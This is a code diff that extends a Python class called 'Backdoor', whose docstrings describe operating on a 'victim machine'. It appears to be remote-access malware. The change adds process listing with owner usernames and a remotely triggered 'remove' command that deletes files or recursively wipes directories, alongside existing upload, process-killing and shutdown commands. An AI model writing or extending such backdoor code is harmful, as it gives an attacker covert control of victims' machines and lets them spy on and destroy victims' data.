@@ -130,11 +130,39 @@ class Backdoor:
     def listOfProcesses(self):
         """A function used for listing all the background processes of the victim machine"""
         pid_dict = {}
-        for pid in psutil.pids():
-            pid_dict[pid] = psutil.Process(pid).name()
-        
-        return pid_dict
+        try:
+            if platform.system() == "Windows":
+                # Windows process listing
+                for proc in psutil.process_iter(['pid', 'name', 'username']):
+                    try:
+                        pinfo = proc.info
+                        pid_dict[pinfo['pid']] = {
+                            'name': pinfo['name'],
+                            'username': pinfo['username']
+                        }
+                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                        pass
+            else:
+                # Linux/Unix process listing
+                for pid in psutil.pids():
+                    pid_dict[pid] = psutil.Process(pid).name()
+            return pid_dict
+        except Exception as e:
+            return f"Error listing processes: {str(e)}"
 
+    def removeFile(self, filepath):
+        """A function used for removing files from the victim machine"""
+        try:
+            if os.path.exists(filepath):
+                if os.path.isfile(filepath):
+                    os.remove(filepath)
+                    return f"File {filepath} removed successfully!"
+                elif os.path.isdir(filepath):
+                    shutil.rmtree(filepath)
+                    return f"Directory {filepath} removed successfully!"
+            return f"Error: {filepath} does not exist!"
+        except Exception as e:
+            return f"Error removing {filepath}: {str(e)}"
 
     def killProcessByName(self,processName):    
         """A function used for killing background processes form the victim machine"""
@@ -312,6 +340,9 @@ class Backdoor:
                 elif command[0].lower() == "upload" and len(command) > 1:
                     self.send("Okay Sir")
                     self.upload(command[1],self.recive(self.connection))
+
+                elif command[0].lower() == "remove" and len(command) > 1:
+                    self.send(self.removeFile(command[1]))
                 
                 elif command[0].lower() == "shutdown" and len(command) == 1:
                     self.shutDown()
